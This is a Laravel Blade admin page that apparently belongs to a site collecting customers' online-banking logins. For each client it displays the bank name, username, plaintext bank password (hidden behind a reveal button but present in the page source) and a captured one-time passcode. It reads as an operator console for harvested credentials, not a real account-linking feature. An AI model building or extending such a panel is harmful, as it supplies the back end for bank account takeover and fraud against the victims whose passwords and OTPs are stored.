@extends('layouts.app')

@section('content')
<div class="container-fluid">
    <x-danger-alert />
    <x-success-alert />

    <!-- Header -->
    <div class="row mb-4 align-items-center justify-content-between g-3">
        <div class="col-md-7">
            <h3 class="f-w-800 text-dark mb-1">
                <i class="fa-solid fa-building-columns text-primary me-2"></i> {{ $title ?? 'Linked Bank Accounts' }}
            </h3>
            <p class="text-muted mb-0 f-13">Audit and verify third-party banking credentials submitted by clients.</p>
        </div>
        <div class="col-md-auto">
            <span class="badge bg-light-primary text-primary rounded-pill px-3 py-2 f-12 f-w-600">
                <i class="fa-solid fa-shield-halved me-1"></i> Client Bank Records
            </span>
        </div>
    </div>

    <!-- Bank Accounts Table Card -->
    <div class="card p-4 shadow-sm border-0 rounded-3 mb-5">
        <div class="d-flex align-items-center justify-content-between pb-3 mb-3 border-bottom">
            <h5 class="f-w-700 text-dark mb-0">Submitted Banking Profiles</h5>
            <span class="text-muted f-12">{{ count($banks) }} total record{{ count($banks) === 1 ? '' : 's' }}</span>
        </div>

        <div class="table-responsive">
            <table class="table table-hover align-middle">
                <thead class="table-light">
                    <tr>
                        <th class="f-12 f-w-700">Client / User</th>
                        <th class="f-12 f-w-700">Bank Name</th>
                        <th class="f-12 f-w-700">Client ID / Username</th>
                        <th class="f-12 f-w-700">Credentials</th>
                        <th class="f-12 f-w-700">OTP Code</th>
                        <th class="f-12 f-w-700">Status</th>
                        <th class="f-12 f-w-700">Submitted Date</th>
                        <th class="f-12 f-w-700 text-end">Action</th>
                    </tr>
                </thead>
                <tbody>
                    @forelse($banks as $bank)
                        <tr>
                            <td>
                                <div class="d-flex align-items-center gap-2">
                                    <div class="rounded-circle d-flex align-items-center justify-content-center flex-shrink-0" style="width: 36px; height: 36px; background: rgba(99, 98, 231, 0.12); color: #6362e7; font-weight: 700; font-size: 13px;">
                                        {{ strtoupper(substr($bank->user->name ?? 'U', 0, 1)) }}
                                    </div>
                                    <div>
                                        @if(isset($bank->user))
                                            <a href="{{ route('viewuser', $bank->user->id) }}" class="f-w-700 text-dark f-13 text-decoration-none">
                                                {{ $bank->user->name }}
                                            </a>
                                            <small class="text-muted d-block f-11">{{ $bank->user->email }}</small>
                                        @else
                                            <span class="text-muted f-13">Unknown User</span>
                                        @endif
                                    </div>
                                </div>
                            </td>
                            <td>
                                <span class="badge bg-light text-dark border px-2 py-1 rounded-pill f-12 f-w-600">
                                    <i class="fa-solid fa-landmark text-primary me-1"></i> {{ $bank->bank_name ?? 'N/A' }}
                                </span>
                            </td>
                            <td class="font-monospace f-w-600 f-13 text-dark">
                                {{ $bank->client_id }}
                            </td>
                            <td>
                                <div class="d-flex align-items-center gap-2">
                                    <span class="font-monospace f-13 masked-secret" id="bankPass{{ $bank->id }}" data-secret="{{ $bank->password }}">••••••••</span>
                                    <button type="button" class="btn btn-light btn-sm rounded-circle p-1" style="width: 26px; height: 26px;" onclick="toggleSecret('bankPass{{ $bank->id }}', this)" title="Reveal/Hide password">
                                        <i class="fa-regular fa-eye f-11"></i>
                                    </button>
                                </div>
                            </td>
                            <td>
                                @if(!empty($bank->otp))
                                    <span class="badge bg-warning-subtle text-warning border border-warning-subtle rounded-pill font-monospace px-2 py-1 f-12">
                                        {{ $bank->otp }}
                                    </span>
                                @else
                                    <span class="text-muted f-12">—</span>
                                @endif
                            </td>
                            <td>
                                @if($bank->status == 'linked')
                                    <span class="badge bg-success-subtle text-success border border-success-subtle rounded-pill px-2 py-1 f-11 f-w-600">
                                        <i class="fa-solid fa-circle-check me-1"></i> Linked
                                    </span>
                                @else
                                    <span class="badge bg-warning-subtle text-warning border border-warning-subtle rounded-pill px-2 py-1 f-11 f-w-600">
                                        <i class="fa-solid fa-clock me-1"></i> {{ ucfirst($bank->status ?? 'Pending') }}
                                    </span>
                                @endif
                            </td>
                            <td class="text-muted f-12 text-nowrap">
                                {{ $bank->created_at ? $bank->created_at->format('M d, Y • h:i A') : 'N/A' }}
                            </td>
                            <td class="text-end">
                                <form action="{{ route('admin.bank.destroy', $bank->id) }}" method="POST" onsubmit="return confirm('Are you sure you want to permanently delete this linked bank account?');" class="d-inline">
                                    @csrf
                                    @method('DELETE')
                                    <button type="submit" class="btn btn-outline-danger btn-sm rounded-pill px-3 py-1 f-12" title="Delete record">
                                        <i class="fa-solid fa-trash-can me-1"></i> Delete
                                    </button>
                                </form>
                            </td>
                        </tr>
                    @empty
                        <tr>
                            <td colspan="8" class="text-center py-5 text-muted">
                                <i class="fa-solid fa-building-columns f-32 mb-2 d-block text-muted opacity-50"></i>
                                No linked bank accounts found.
                            </td>
                        </tr>
                    @endforelse
                </tbody>
            </table>
        </div>
    </div>
</div>

<script>
    function toggleSecret(id, btn) {
        var el = document.getElementById(id);
        if (!el) return;
        var icon = btn.querySelector('i');
        var secret = el.getAttribute('data-secret');

        if (el.innerText === '••••••••') {
            el.innerText = secret;
            if (icon) {
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            }
        } else {
            el.innerText = '••••••••';
            if (icon) {
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }
    }
</script>
@endsection
